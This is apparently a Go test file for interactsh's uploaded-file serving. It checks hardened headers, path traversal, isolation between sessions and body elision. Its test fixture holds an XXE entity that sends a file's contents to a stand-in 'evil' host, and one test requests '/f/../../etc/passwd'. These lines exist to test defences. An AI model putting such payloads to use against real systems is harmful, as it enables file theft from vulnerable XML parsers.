package server

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	jsoniter "github.com/json-iterator/go"
	"github.com/projectdiscovery/interactsh/pkg/storage"
	stringsutil "github.com/projectdiscovery/utils/strings"
	"github.com/stretchr/testify/require"
)

// serveRequest issues a GET for a hosted file against the given host.
func serveRequest(t *testing.T, h *HTTPServer, host, path string) *http.Response {
	t.Helper()
	// Path-only target, so the dumped request line matches what a real server
	// sees rather than an absolute-URI form.
	req := httptest.NewRequest(http.MethodGet, path, nil)
	req.Host = host
	req.RemoteAddr = "203.0.113.7:5555"
	w := httptest.NewRecorder()
	h.serveUploadedFile(w, req)
	return w.Result()
}

func TestServeUploadedFile(t *testing.T) {
	content := []byte(`<!ENTITY % p SYSTEM "http://evil/?x=%file;">`)

	setup := func(t *testing.T, name string) (*HTTPServer, string, string) {
		t.Helper()
		h, id, secret := uploadTestServer(t, true)
		resp := doUpload(t, h, uploadBody(t, id, secret, map[string][]byte{name: content}))
		require.Equal(t, http.StatusOK, resp.StatusCode)
		return h, id, secret
	}

	t.Run("serves the exact bytes with hardened headers", func(t *testing.T) {
		h, id, _ := setup(t, "evil.dtd")

		resp := serveRequest(t, h, payloadHost(id), "/f/evil.dtd")
		require.Equal(t, http.StatusOK, resp.StatusCode)

		body, err := io.ReadAll(resp.Body)
		require.NoError(t, err)
		require.Equal(t, content, body)

		require.Equal(t, "application/octet-stream", resp.Header.Get("Content-Type"))
		require.Equal(t, `attachment; filename=evil.dtd`, resp.Header.Get("Content-Disposition"))
		require.Equal(t, "nosniff", resp.Header.Get("X-Content-Type-Options"))
	})

	// The old design served from defaultHandler, where these two branches
	// would have hijacked the request and returned reflection markup.
	t.Run("xml and json names are not hijacked", func(t *testing.T) {
		for _, name := range []string{"payload.xml", "payload.json"} {
			h, id, _ := setup(t, name)
			resp := serveRequest(t, h, payloadHost(id), "/f/"+name)
			require.Equal(t, http.StatusOK, resp.StatusCode)

			body, err := io.ReadAll(resp.Body)
			require.NoError(t, err)
			require.Equal(t, content, body, "%s must return the file, not reflected markup", name)
		}
	})

	// -dhr returns early for every request inside defaultHandler.
	t.Run("default http response file does not shadow it", func(t *testing.T) {
		h, id, _ := setup(t, "evil.dtd")
		h.defaultResponse = "<html>default response</html>"

		resp := serveRequest(t, h, payloadHost(id), "/f/evil.dtd")
		require.Equal(t, http.StatusOK, resp.StatusCode)
		body, _ := io.ReadAll(resp.Body)
		require.Equal(t, content, body)
	})

	// -dr lets query parameters inject headers on the /s/ static path.
	t.Run("dynamic response cannot override the hardened headers", func(t *testing.T) {
		h, id, _ := setup(t, "evil.dtd")
		h.options.DynamicResp = true

		resp := serveRequest(t, h, payloadHost(id), "/f/evil.dtd?header=Content-Type:text/html&status=201")
		require.Equal(t, http.StatusOK, resp.StatusCode, "status must not be attacker controlled")
		require.Equal(t, "application/octet-stream", resp.Header.Get("Content-Type"))
	})

	t.Run("404s", func(t *testing.T) {
		h, id, _ := setup(t, "evil.dtd")

		t.Run("host without a correlation id", func(t *testing.T) {
			resp := serveRequest(t, h, "www.oast.test", "/f/evil.dtd")
			require.Equal(t, http.StatusNotFound, resp.StatusCode)
		})
		t.Run("unknown file", func(t *testing.T) {
			resp := serveRequest(t, h, payloadHost(id), "/f/absent.dtd")
			require.Equal(t, http.StatusNotFound, resp.StatusCode)
		})
		t.Run("traversal", func(t *testing.T) {
			resp := serveRequest(t, h, payloadHost(id), "/f/../../etc/passwd")
			require.Equal(t, http.StatusNotFound, resp.StatusCode)
		})
		t.Run("file owned by a different session", func(t *testing.T) {
			other, otherID, otherSecret := uploadTestServer(t, true)
			r := doUpload(t, other, uploadBody(t, otherID, otherSecret, map[string][]byte{"secret.dtd": []byte("theirs")}))
			require.Equal(t, http.StatusOK, r.StatusCode)

			// Ask our server, using our session, for their file name.
			resp := serveRequest(t, h, payloadHost(id), "/f/secret.dtd")
			require.Equal(t, http.StatusNotFound, resp.StatusCode)
		})
		t.Run("uploads disabled", func(t *testing.T) {
			off, offID, _ := uploadTestServer(t, false)
			resp := serveRequest(t, off, payloadHost(offID), "/f/evil.dtd")
			require.Equal(t, http.StatusNotFound, resp.StatusCode)
		})
	})
}

func TestServeUploadedFileRecordsInteraction(t *testing.T) {
	h, id, secret := uploadTestServer(t, true)
	content := []byte("dtd content")
	require.Equal(t, http.StatusOK,
		doUpload(t, h, uploadBody(t, id, secret, map[string][]byte{"evil.dtd": content})).StatusCode)

	resp := serveRequest(t, h, payloadHost(id), "/f/evil.dtd")
	require.Equal(t, http.StatusOK, resp.StatusCode)

	// Read the raw buffer rather than GetInteractions: in memory mode the
	// latter encrypts on the way out, and we want to inspect what was stored.
	item, err := h.options.Storage.GetCacheItem(id)
	require.NoError(t, err)
	require.Len(t, item.Data, 1, "the fetch must be visible to the client that owns the session")

	record := &Interaction{}
	require.NoError(t, jsoniter.Unmarshal([]byte(item.Data[0]), record))

	require.Equal(t, "http", record.Protocol)
	require.Contains(t, record.RawRequest, "GET /f/evil.dtd")
	require.Equal(t, "203.0.113.7", record.RemoteAddress)
	require.Contains(t, record.RawResponse, "200 OK")
	require.Contains(t, record.RawResponse, "body elided")
}

// The reason serving sits outside the logger middleware: routed through it, a
// fetch would retain a multiple of the file size in the session's interaction
// buffer.
func TestServeUploadedFileElidesBody(t *testing.T) {
	h, id, secret := uploadTestServer(t, true)
	h.options.UploadStore.maxFileSize = 1 << 20

	// Bytes that JSON-escape badly, which is what drove the amplification.
	content := make([]byte, 512*1024)
	for i := range content {
		content[i] = 0xff
	}
	require.Equal(t, http.StatusOK,
		doUpload(t, h, uploadBody(t, id, secret, map[string][]byte{"big.bin": content})).StatusCode)

	for i := 0; i < 5; i++ {
		require.Equal(t, http.StatusOK, serveRequest(t, h, payloadHost(id), "/f/big.bin").StatusCode)
	}

	item, err := h.options.Storage.GetCacheItem(id)
	require.NoError(t, err)
	require.Len(t, item.Data, 5)

	var total int
	for _, raw := range item.Data {
		total += len(raw)
		require.NotContains(t, raw, strings.Repeat("\\ufffd", 64),
			"file bytes must not be copied into the interaction record")
	}
	t.Logf("5 fetches of a 512KiB file retained %d bytes of interaction data", total)
	require.Less(t, total, 32*1024,
		fmt.Sprintf("5 fetches of a 512KiB file retained %d bytes; body elision is not working", total))
}

func TestExtractCorrelationIDMatchesLogger(t *testing.T) {
	options := &Options{CorrelationIdLength: 20, CorrelationIdNonceLength: 13}
	id := "c6rj61aciaeutn2ae680"
	nonce := "xk4tqy8pqhwty"

	cases := []string{
		id + nonce + ".oast.test",
		id + nonce + ".sub.oast.test",
		strings.ToUpper(id+nonce) + ".oast.test",
		id + nonce + ".oast.test:8080",
		"www.oast.test",
		"",
		id + ".oast.test", // too short to be a full unique id
	}

	for _, host := range cases {
		wantUnique, wantFull := loggerStyleExtract(options, host)
		gotUnique, gotFull := options.extractCorrelationID(host)
		require.Equal(t, wantUnique, gotUnique, "unique id mismatch for host %q", host)
		require.Equal(t, wantFull, gotFull, "full id mismatch for host %q", host)
	}
}

// loggerStyleExtract reproduces the extraction the logger middleware performs,
// so the two implementations can be compared directly.
func loggerStyleExtract(options *Options, host string) (string, string) {
	if hostOnly, _, err := net.SplitHostPort(host); err == nil {
		host = hostOnly
	}
	parts := strings.Split(host, ".")
	for i, part := range parts {
		for partChunk := range stringsutil.SlideWithLength(part, options.GetIdLength()) {
			normalized := strings.ToLower(partChunk)
			if options.isCorrelationID(normalized) {
				fullID := part
				if i+1 <= len(parts) {
					fullID = strings.Join(parts[:i+1], ".")
				}
				return normalized, fullID
			}
		}
	}
	return "", ""
}

// noUploadStorage is a Storage without the UploadStorage capability, standing in
// for a shared backend such as Redis. Embedding the interface supplies every
// Storage method while deliberately omitting UpdateUploads and ListUploads.
type noUploadStorage struct{ storage.Storage }

// TestUploadsDegradeWhenBackendCannotTrackThem covers the path a deployment on a
// shared storage backend would take. The server must decline uploads outright
// rather than advertise a capability it cannot honour, or panic reaching for a
// nil capability.
func TestUploadsDegradeWhenBackendCannotTrackThem(t *testing.T) {
	h, id, secret := uploadTestServer(t, true)
	require.True(t, h.capabilities().Upload, "precondition: a capable backend advertises uploads")

	resp := doUpload(t, h, uploadBody(t, id, secret, map[string][]byte{"evil.dtd": []byte("payload")}))
	require.Equal(t, http.StatusOK, resp.StatusCode, "precondition: upload works before swapping the backend")

	// Swap in a backend that cannot track uploads. The files stay on disk, so
	// this isolates the capability check from the storage contents.
	h.options.Storage = noUploadStorage{h.options.Storage}
	require.Nil(t, h.options.UploadStorage(), "backend must not satisfy UploadStorage")

	require.False(t, h.capabilities().Upload, "capability must not be advertised without backend support")

	resp = doUpload(t, h, uploadBody(t, id, secret, map[string][]byte{"other.dtd": []byte("x")}))
	require.Equal(t, http.StatusNotImplemented, resp.StatusCode, "upload must report unsupported, not fail late")

	served := serveRequest(t, h, payloadHost(id), "/f/evil.dtd")
	require.Equal(t, http.StatusNotFound, served.StatusCode, "serving must 404 rather than dereference a nil capability")
}
